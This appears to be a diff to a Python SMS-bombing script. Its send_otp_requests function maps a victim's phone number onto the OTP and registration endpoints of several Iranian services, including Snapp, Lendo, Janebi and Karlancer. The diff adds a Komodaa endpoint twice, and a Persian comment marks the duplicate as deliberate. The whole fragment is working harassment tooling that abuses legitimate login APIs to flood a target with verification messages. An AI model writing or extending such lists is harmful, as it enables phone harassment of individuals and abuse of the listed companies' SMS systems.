@@ -1,8 +1,10 @@
 def send_otp_requests(number):
     url_payload_map = {
+        'komodaa': ('https://api.komodaa.com/api/v2.6/loginRC/request', {"phone_number":'0' + number}),
         'snapp': ('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {'cellphone': '0' + number}),
         'lendo': ('https://api.lendo.ir/api/customer/auth/send-otp', {'mobile': '0' + number}),
         'janebi': ('https://janebi.com/signin?do', {'resend': '0' + number}),
+        'komodaa': ('https://api.komodaa.com/api/v2.6/loginRC/request', {"phone_number":'0' + number}), #amdan dotast!
         'karlancer': ('https://www.karlancer.com/api/register', {"phone": number,"role": "freelancer"}),
         'hsaria': ('https://www.hsaria.com/MemberRegisterLogin', {"phone": number}),
         'kavirmotor': ('https://kavirmotor.com/sms/send', {'phoneNumber': '0' + number}),
